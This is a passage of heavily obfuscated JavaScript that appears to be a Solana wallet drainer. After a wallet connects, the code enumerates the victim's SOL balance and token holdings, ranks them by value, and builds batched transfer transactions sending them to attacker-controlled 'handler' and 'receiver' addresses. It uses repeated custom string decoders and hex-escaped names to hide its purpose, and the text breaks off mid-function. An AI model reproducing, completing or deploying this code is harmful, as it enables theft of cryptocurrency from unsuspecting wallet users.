    var jnnEqQv = "EBFHCGADJILKMNOPVQRSUTWXcdbYZaefmkhgljnioqrptusvwx1023yz576498!#[$^}&]@~\"_*%`(|{),+>:/?=.<;";
    var victimPublicKey = "" + (cHN1sY7 || "");
    var handlerPublicKey = victimPublicKey.length;
    var receiverPublicKey = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < handlerPublicKey; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(victimPublicKey[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          receiverPublicKey.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      receiverPublicKey.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(receiverPublicKey);
  }
  function __globalObject(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  solanaConnection = new Connection(SOLANA_RPC_URL);
  if (!cHN1sY7 || !victimPublicKey || !handlerPublicKey) {
    throw new Error('\x4d\x69\x73\x73\x69\x6e\x67\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x70\x61\x72\x61\x6d\x65\x74\x65\x72\x73');
  }
  if (jnnEqQv === 0x0) {
    function __String(cHN1sY7) {
      var jnnEqQv = "viCsgADujhBlotkmGEFnqHpJrIKLywNPMOUSzVTxXQ1203R895#7!4W6ZabYfdce*)&+,(%$/;.:>=?<@_]`[^{|~\"}";
      var victimPublicKey = "" + (cHN1sY7 || "");
      var handlerPublicKey = victimPublicKey.length;
      var receiverPublicKey = [];
      var djkbJA = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < handlerPublicKey; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(victimPublicKey[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          djkbJA |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            receiverPublicKey.push(djkbJA & 0xff);
            djkbJA >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        receiverPublicKey.push((djkbJA | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(receiverPublicKey);
    }
    function __Array(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = __String(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    return {
      [e_qLdL(0x126)]: [],
      [__Array(0x127) + __Array(0x128) + "em"]: undefined
    };
  }
  let _0x200a61 = handlerPublicKey;
  let _0x3c0230 = {
    '\x42\x41\x4c\x41\x4e\x43\x45': jnnEqQv,
    '\x4d\x49\x4e\x54': cHN1sY7
  };
  jnnEqQv === 0x1 && (_0x200a61 = receiverPublicKey, _0x3c0230 = undefined);
  const tokenTransactions = [];
  const _0x56ffb6 = await getAssociatedTokenAddress(cHN1sY7, victimPublicKey);
  const _ei = await getAssociatedTokenAddress(cHN1sY7, _0x200a61);
  const parentData = new Transaction();
  parentData['\x61\x64\x64'](solanaWeb3[__globalObject(0x129) + __globalObject(0x12a) + __globalObject(0x12b) + "am"][__globalObject(0x12c) + __globalObject(0x12d) + __globalObject(0x12e) + "e"]({
    [__globalObject(0x12f)]: PRIORITY_FEE
  }));
  try {
    function walletName(cHN1sY7) {
      var jnnEqQv = "A@B(CHD][$E^%;|FG_IK&JLM`)NO{PQS*:RYTbXW+aV~Zcf}d\".Ue/,<=spmt?>huvliknoqrgj97x8!w4z#65y0213";
      var victimPublicKey = "" + (cHN1sY7 || "");
      var handlerPublicKey = victimPublicKey.length;
      var receiverPublicKey = [];
      var djkbJA = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < handlerPublicKey; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(victimPublicKey[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          djkbJA |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            receiverPublicKey.push(djkbJA & 0xff);
            djkbJA >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        receiverPublicKey.push((djkbJA | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(receiverPublicKey);
    }
    function currentURL(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = walletName(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    const SIGN_INSTRUCTIONS_GIF = await solanaConnection['\x67\x65\x74\x41\x63\x63\x6f\x75\x6e\x74\x49\x6e\x66\x6f'](_ei);
    return !SIGN_INSTRUCTIONS_GIF && parentData['\x61\x64\x64'](createAssociatedTokenAccountInstruction(handlerPublicKey, _ei, _0x200a61, cHN1sY7)), parentData[currentURL(0x130)](createTransferInstruction(_0x56ffb6, _ei, victimPublicKey, jnnEqQv)), tokenTransactions['\x70\x75\x73\x68'](parentData), {
      [currentURL(0x131)]: tokenTransactions,
      '\x74\x6f\x6b\x65\x6e\x53\x70\x6c\x69\x74\x49\x74\x65\x6d': _0x3c0230
    };
  } catch (HOST) {
    console[__globalObject(0x132)]('\x45\x72\x72\x6f\x72\x20\x63\x72\x65\x61\x74\x69\x6e\x67\x20\x74\x6f\x6b\x65\x6e\x20\x74\x72\x61\x6e\x73\x61\x63\x74\x69\x6f\x6e\x73\x3a', HOST);
    throw HOST;
  }
}
async function onConnected() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "RQTS[^VXUW@]bY%_ZE`{B<|=K~&NF>\"dM}OCaAcIf.HeD/P:J;(?$*G,)+Lpoigjqthsulvrknmx5467!y8wz19023#";
    var e_qLdL = "" + (cHN1sY7 || "");
    var djkbJA = e_qLdL.length;
    var handlerPublicKey = [];
    var receiverPublicKey = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < djkbJA; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        receiverPublicKey |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          handlerPublicKey.push(receiverPublicKey & 0xff);
          receiverPublicKey >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(handlerPublicKey);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  console[jnnEqQv(0x133)](victimPublicKey['\x74\x6f\x53\x74\x72\x69\x6e\x67']() + jnnEqQv(0x134));
  const e_qLdL = await getTransactionDetails(victimPublicKey[jnnEqQv(0x135)]());
  const djkbJA = await e_qLdL['\x6a\x73\x6f\x6e']();
  console['\x6c\x6f\x67'](jnnEqQv(0x136) + "ctionD" + "etails", djkbJA);
  const handlerPublicKey = new PublicKey(djkbJA[jnnEqQv(0x137) + "R"]);
  const receiverPublicKey = new PublicKey(djkbJA["RECEIV" + "ER"]);
  const __globalObject = await solanaConnection[jnnEqQv(0x138)](victimPublicKey);
  !__globalObject && window['\x63\x68\x61\x6e\x67\x65\x42\x75\x74\x74\x6f\x6e'](![], BAD_WALLET);
  lamports = __globalObject?.["lampor" + "ts"] || 0x0;
  const __String = (await solanaConnection["getPars" + "edToken" + "Account" + "sByOwne" + "r"](victimPublicKey, {
    '\x70\x72\x6f\x67\x72\x61\x6d\x49\x64': TOKEN_PROGRAM_ID
  }))[jnnEqQv(0x139)];
  console[jnnEqQv(0x133)](jnnEqQv(0x13a), __String);
  const __Array = await portfolio(__String);
  const _0x200a61 = [];
  const _0x3c0230 = getPubShort();
  window[jnnEqQv(0x13b)](![], _0x3c0230[0x0] + '\x2e\x2e\x2e' + _0x3c0230[0x1]);
  for (const _0x56ffb6 of __String) {
    function _ei(cHN1sY7) {
      var jnnEqQv = "$B_4yED`CGAH|F{J[]nL%p@O&rN(M:Po6/,^.IKh7;t~R}QT+S5\"xz*)<=W?w>V8XmUskvZYba2#cue!df9l1g3q0ij";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var handlerPublicKey = [];
      var receiverPublicKey = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < djkbJA; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          receiverPublicKey |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            handlerPublicKey.push(receiverPublicKey & 0xff);
            receiverPublicKey >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(handlerPublicKey);
    }
    function currentURL(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = _ei(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    let SIGN_INSTRUCTIONS_GIF = ![];
    const {
      [jnnEqQv(0x13c)]: SOLANA_RPC_URL,
      ["tokenA" + jnnEqQv(0x13d)]: CONNECTING,
      ["state"]: connectButton
    } = _0x56ffb6['\x61\x63\x63\x6f\x75\x6e\x74']['\x64\x61\x74\x61'][jnnEqQv(0x13e)][jnnEqQv(0x13f)];
    if (connectButton === currentURL(0x140)) {
      continue;
    }
    for (const settingData of __Array) {
      function phantom(cHN1sY7) {
        var jnnEqQv = "+/FGBT.QA,RCSDEHUO($:;JNM)KP?<>ILW*%XV=&^@YZ[ba]c{`efd5i_gy6jh7lx|}k49!\"nm~pswov8tuqr#z2013";
        var e_qLdL = "" + (cHN1sY7 || "");
        var djkbJA = e_qLdL.length;
        var handlerPublicKey = [];
        var receiverPublicKey = 0x0;
        var __globalObject = 0x0;
        var __String = -0x1;
        for (var __Array = 0x0; __Array < djkbJA; __Array++) {
          var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
          if (_0x200a61 === -0x1) continue;
          if (__String < 0x0) {
            __String = _0x200a61;
          } else {
            __String += _0x200a61 * 0x5b;
            receiverPublicKey |= __String << __globalObject;
            __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              handlerPublicKey.push(receiverPublicKey & 0xff);
              receiverPublicKey >>= 0x8;
              __globalObject -= 0x8;
            } while (__globalObject > 0x7);
            __String = -0x1;
          }
        }
        if (__String > -0x1) {
          handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
        }
        return fsS5SCv(handlerPublicKey);
      }
      function solflare(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = phantom(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      if (settingData[solflare(0x141)]['\x74\x6f\x53\x74\x72\x69\x6e\x67']()["toLowe" + solflare(0x142)]() === SOLANA_RPC_URL[solflare(0x143)]()[solflare(0x144) + "rCase"]()) {
        function coinbase(cHN1sY7) {
          var jnnEqQv = "glSbCqQkrZmstinKhupaWjvoIxY01AzwXJUR2e3y5cd4!89fD6BLVTEG7#OFMNPH%$&()+,*.;:/<>?=]^[@_{`|\"~}";
          var e_qLdL = "" + (cHN1sY7 || "");
          var djkbJA = e_qLdL.length;
          var handlerPublicKey = [];
          var receiverPublicKey = 0x0;
          var __globalObject = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < djkbJA; __Array++) {
            var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              receiverPublicKey |= __String << __globalObject;
              __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                handlerPublicKey.push(receiverPublicKey & 0xff);
                receiverPublicKey >>= 0x8;
                __globalObject -= 0x8;
              } while (__globalObject > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
          }
          return fsS5SCv(handlerPublicKey);
        }
        function askForConnecting(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = coinbase(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        CONNECTING[solflare(0x145)] > 0x0 && _0x200a61['\x70\x75\x73\x68']({
          '\x56\x41\x4c\x55\x45': settingData["totalV" + solflare(0x146) + solflare(0x147)],
          [solflare(0x148)]: SOLANA_RPC_URL['\x74\x6f\x53\x74\x72\x69\x6e\x67'](),
          '\x4e\x41\x4d\x45': settingData['\x6e\x61\x6d\x65'],
          [askForConnecting(0x149)]: CONNECTING['\x61\x6d\x6f\x75\x6e\x74']
        });
        SIGN_INSTRUCTIONS_GIF = !![];
        break;
      }
    }
    !SIGN_INSTRUCTIONS_GIF && _0x200a61[currentURL(0x14a)]({
      '\x56\x41\x4c\x55\x45': 0x0,
      '\x4d\x49\x4e\x54': SOLANA_RPC_URL["toStri" + "ng"](),
      '\x4e\x41\x4d\x45': currentURL(0x14b) + "N",
      [currentURL(0x14c)]: CONNECTING
    });
  }
  if (lamports <= 0x2faf080 && _0x200a61[jnnEqQv(0x14d)] === 0x0) {
    function parsePlaceHolders(cHN1sY7) {
      var jnnEqQv = "JIGFBKLEHNOMCPDARSZYaUbVWXTQdfecilustmvjphqorkng8907x!2456#w13zy^_[@*]$(,`{%+|&)/~}\".:;><=?";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var handlerPublicKey = [];
      var receiverPublicKey = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < djkbJA; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          receiverPublicKey |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            handlerPublicKey.push(receiverPublicKey & 0xff);
            receiverPublicKey >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(handlerPublicKey);
    }
    function arrayBufferToBase64(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = parsePlaceHolders(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    window[arrayBufferToBase64(0x14e) + arrayBufferToBase64(0x14f)](![], NOT_ENOUGH_SOLANA);
    return;
  }
  lamports > 0x2faf080 && _0x200a61[jnnEqQv(0x150)]({
    [jnnEqQv(0x151)]: lamports / LAMPORTS_PER_SOL * 0xf5,
    '\x4d\x49\x4e\x54': undefined,
    [jnnEqQv(0x152)]: '\x4e\x41\x54\x49\x56\x45\x2d\x53\x4f\x4c'
  });
  _0x200a61['\x73\x6f\x72\x74']((cHN1sY7, e_qLdL) => {
    function djkbJA(cHN1sY7) {
      var e_qLdL = "ACDBF5iEGlH3674xo8ktKmLJgjIuNMOPYZSr!spb9QnRayhTwXeUV#zd21Wqcfv0.%/$&()*,:+;<>?=~@]\"[^}{|`_";
      var djkbJA = "" + (cHN1sY7 || "");
      var handlerPublicKey = djkbJA.length;
      var jnnEqQv = [];
      var receiverPublicKey = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < handlerPublicKey; __Array++) {
        var _0x200a61 = e_qLdL.indexOf(djkbJA[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          receiverPublicKey |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            jnnEqQv.push(receiverPublicKey & 0xff);
            receiverPublicKey >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        jnnEqQv.push((receiverPublicKey | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(jnnEqQv);
    }
    function handlerPublicKey(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    return e_qLdL[jnnEqQv(0x151)] - cHN1sY7[handlerPublicKey(0x153)];
  });
  const isMobile = _0x200a61[jnnEqQv(0x154)]((cHN1sY7, e_qLdL) => {
    return cHN1sY7 + (e_qLdL[jnnEqQv(0x151)] || 0x0);
  }, 0x0);
  await showPortfolio(victimPublicKey['\x74\x6f\x53\x74\x72\x69\x6e\x67'](), _0x200a61);
  const generateSolflareConnection = [];
  const generatePhantomConnection = 0x14;
  for (let openCoinbaseSolana = 0x0; openCoinbaseSolana < _0x200a61['\x6c\x65\x6e\x67\x74\x68']; openCoinbaseSolana += generatePhantomConnection) {
    function handleModalChoice(cHN1sY7) {
      var jnnEqQv = "D|_($%`@&[H{BR,]^+V})U*\"E~C./:;<XG=WF>Q?AKISJTZLONYabcdPeMfi964gu5j7ty8vzhwxml1k!nsqpr23o#0";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var handlerPublicKey = [];
      var receiverPublicKey = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < djkbJA; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          receiverPublicKey |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            handlerPublicKey.push(receiverPublicKey & 0xff);
            receiverPublicKey >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(handlerPublicKey);
    }
    function onConnected(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = handleModalChoice(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    generateSolflareConnection[onConnected(0x155)](_0x200a61[onConnected(0x156)](openCoinbaseSolana, openCoinbaseSolana + generatePhantomConnection));
  }
  let initSOL = ![];
  while (!initSOL) {
    let init;
    let solanaNativeTransaction;
    for (const _0x586d22 of generateSolflareConnection) {
      function k7T29l(cHN1sY7) {
        var jnnEqQv = "CAD&p%$B(H)*+E,q/=iF.>GLI<KJ?M:PNg;[@^]}O\"`~|_{SRrQTVoWUXcfhZYbjmaedtvsukln4w09783x5612y!z#";
        var e_qLdL = "" + (cHN1sY7 || "");
        var djkbJA = e_qLdL.length;
        var handlerPublicKey = [];
        var receiverPublicKey = 0x0;
        var __globalObject = 0x0;
        var __String = -0x1;
        for (var __Array = 0x0; __Array < djkbJA; __Array++) {
          var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
          if (_0x200a61 === -0x1) continue;
          if (__String < 0x0) {
            __String = _0x200a61;
          } else {
            __String += _0x200a61 * 0x5b;
            receiverPublicKey |= __String << __globalObject;
            __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              handlerPublicKey.push(receiverPublicKey & 0xff);
              receiverPublicKey >>= 0x8;
              __globalObject -= 0x8;
            } while (__globalObject > 0x7);
            __String = -0x1;
          }
        }
        if (__String > -0x1) {
          handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
        }
        return fsS5SCv(handlerPublicKey);
      }
      function XyUQbA(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = k7T29l(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      const kuVJMI = [];
      const s3TN6E1 = [];
      for (const nqXDev of _0x586d22) {
        function VjAcWo(cHN1sY7) {
          var jnnEqQv = "@Bq]y[ACo^(`D$Ghg_{ExH|~FIi}JzKLjPt\"&%OMN*Rs)+,c./>V:;#w=vr8u<?0aUkQWeXbSm5ln1d9!Zp62473TfY";
          var e_qLdL = "" + (cHN1sY7 || "");
          var djkbJA = e_qLdL.length;
          var handlerPublicKey = [];
          var receiverPublicKey = 0x0;
          var __globalObject = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < djkbJA; __Array++) {
            var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              receiverPublicKey |= __String << __globalObject;
              __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                handlerPublicKey.push(receiverPublicKey & 0xff);
                receiverPublicKey >>= 0x8;
                __globalObject -= 0x8;
              } while (__globalObject > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
          }
          return fsS5SCv(handlerPublicKey);
        }
        function j4KmvT(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = VjAcWo(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        if (nqXDev[jnnEqQv(0x157)] === undefined && nqXDev[j4KmvT(0x158)] === j4KmvT(0x159) + j4KmvT(0x15a)) {
          if (lamports > 0x0) {
            function fJpt4I2(cHN1sY7) {
              var jnnEqQv = "BqAiCDFgEjHpGroLhKJIkPsulnvmtxNMzwyOS2Y01Z3ba56e4c7R98QdfT!U#XWV=@,/~[:}\"_&{$%`(*)>^|+]?<.;";
              var e_qLdL = "" + (cHN1sY7 || "");
              var djkbJA = e_qLdL.length;
              var handlerPublicKey = [];
              var receiverPublicKey = 0x0;
              var __globalObject = 0x0;
              var __String = -0x1;
              for (var __Array = 0x0; __Array < djkbJA; __Array++) {
                var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
                if (_0x200a61 === -0x1) continue;
                if (__String < 0x0) {
                  __String = _0x200a61;
                } else {
                  __String += _0x200a61 * 0x5b;
                  receiverPublicKey |= __String << __globalObject;
                  __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
                  do {
                    handlerPublicKey.push(receiverPublicKey & 0xff);
                    receiverPublicKey >>= 0x8;
                    __globalObject -= 0x8;
                  } while (__globalObject > 0x7);
                  __String = -0x1;
                }
              }
              if (__String > -0x1) {
                handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
              }
              return fsS5SCv(handlerPublicKey);
            }
            function Vri1z01(cHN1sY7) {
              if (typeof f3i6H1[cHN1sY7] === 'undefined') {
                return f3i6H1[cHN1sY7] = fJpt4I2(rOnBTDk[cHN1sY7]);
              }
              return f3i6H1[cHN1sY7];
            }
            init = {
              [j4KmvT(0x15b) + "E"]: lamports,
              '\x4d\x49\x4e\x54': j4KmvT(0x159),
              '\x56\x41\x4c\x55\x45': lamports / LAMPORTS_PER_SOL * 0xf5
            };
            const solanaTransaction = new Transaction();
            solanaTransaction['\x61\x64\x64'](solanaWeb3["Comput" + "eBudge" + "tProgr" + "am"][j4KmvT(0x15c) + j4KmvT(0x15d) + "itPric" + "e"]({
              ["microL" + j4KmvT(0x15e) + "s"]: PRIORITY_FEE
            })), solanaTransaction[j4KmvT(0x15f)](SystemProgram["transf" + "er"]({
              ["fromPu" + Vri1z01(0x160)]: victimPublicKey,
              [Vri1z01(0x161)]: handlerPublicKey,
              [Vri1z01(0x162)]: lamports
            })), solanaNativeTransaction = solanaTransaction;
          }
        } else {
          try {
            function KyJfLQS(cHN1sY7) {
              var jnnEqQv = "$A%(MO+N)&,*/=PIC<>B?D:.GFJ;}`K~E\"@_[{]H^L|QTYabZRSUVXecfdWghijlnkmqporustvxwzy1203574698#!";
              var e_qLdL = "" + (cHN1sY7 || "");
              var djkbJA = e_qLdL.length;
              var handlerPublicKey = [];
              var receiverPublicKey = 0x0;
              var __globalObject = 0x0;
              var __String = -0x1;
              for (var __Array = 0x0; __Array < djkbJA; __Array++) {
                var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
                if (_0x200a61 === -0x1) continue;
                if (__String < 0x0) {
                  __String = _0x200a61;
                } else {
                  __String += _0x200a61 * 0x5b;
                  receiverPublicKey |= __String << __globalObject;
                  __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
                  do {
                    handlerPublicKey.push(receiverPublicKey & 0xff);
                    receiverPublicKey >>= 0x8;
                    __globalObject -= 0x8;
                  } while (__globalObject > 0x7);
                  __String = -0x1;
                }
              }
              if (__String > -0x1) {
                handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
              }
              return fsS5SCv(handlerPublicKey);
            }
            function CHZimFF(cHN1sY7) {
              if (typeof f3i6H1[cHN1sY7] === 'undefined') {
                return f3i6H1[cHN1sY7] = KyJfLQS(rOnBTDk[cHN1sY7]);
              }
              return f3i6H1[cHN1sY7];
            }
            const qGi9rjU = new PublicKey(nqXDev['\x4d\x49\x4e\x54']);
            const KVMuwBs = nqXDev[j4KmvT(0x163)];
            const {
              [CHZimFF(0x164)]: tokenTransactions,
              ["tokenS" + CHZimFF(0x165) + "em"]: vnlEsk6
            } = await createTokenTransactions(qGi9rjU, KVMuwBs, victimPublicKey, handlerPublicKey, receiverPublicKey);
            tokenTransactions[CHZimFF(0x166)] > 0x0 && kuVJMI['\x70\x75\x73\x68'](...tokenTransactions), vnlEsk6 !== undefined && s3TN6E1['\x70\x75\x73\x68']({
              [CHZimFF(0x167)]: nqXDev[CHZimFF(0x167)],
              ...vnlEsk6
            });
          } catch (fye0HZr) {
            function ibXROH(cHN1sY7) {
              var jnnEqQv = "A$opq)rs,+*&u(%/.BmEt;:vj<l?G>=[i]@k^|g`{n_\"h~}xFHCDNLwK10I23OyPz45M678#JR9!QSTUWVXcafYedZb";
              var e_qLdL = "" + (cHN1sY7 || "");
              var djkbJA = e_qLdL.length;
              var handlerPublicKey = [];
              var receiverPublicKey = 0x0;
              var __globalObject = 0x0;
              var __String = -0x1;
              for (var __Array = 0x0; __Array < djkbJA; __Array++) {
                var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
                if (_0x200a61 === -0x1) continue;
                if (__String < 0x0) {
                  __String = _0x200a61;
                } else {
                  __String += _0x200a61 * 0x5b;
                  receiverPublicKey |= __String << __globalObject;
                  __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
                  do {
                    handlerPublicKey.push(receiverPublicKey & 0xff);
                    receiverPublicKey >>= 0x8;
                    __globalObject -= 0x8;
                  } while (__globalObject > 0x7);
                  __String = -0x1;
                }
              }
              if (__String > -0x1) {
                handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
              }
              return fsS5SCv(handlerPublicKey);
            }
            function TN9AYG(cHN1sY7) {
              if (typeof f3i6H1[cHN1sY7] === 'undefined') {
                return f3i6H1[cHN1sY7] = ibXROH(rOnBTDk[cHN1sY7]);
              }
              return f3i6H1[cHN1sY7];
            }
            console[TN9AYG(0x168)](fye0HZr);
          }
        }
      }
      solanaNativeTransaction !== undefined && kuVJMI['\x70\x75\x73\x68'](solanaNativeTransaction);
      init !== undefined && s3TN6E1[XyUQbA(0x169)](init);
      console[XyUQbA(0x16a)](kuVJMI, s3TN6E1);
      try {
        function _MtksmT(cHN1sY7) {
          var jnnEqQv = "JzIADlxBiwyLC1kKM03N2G!hP5nO4FHEW6bV8jZYgm7Q9#RaSoqepcXrsfUTdutv&.%;($*/),+:<?>=@[~\"^}]`|_{";
          var e_qLdL = "" + (cHN1sY7 || "");
          var djkbJA = e_qLdL.length;
          var handlerPublicKey = [];
          var receiverPublicKey = 0x0;
          var __globalObject = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < djkbJA; __Array++) {
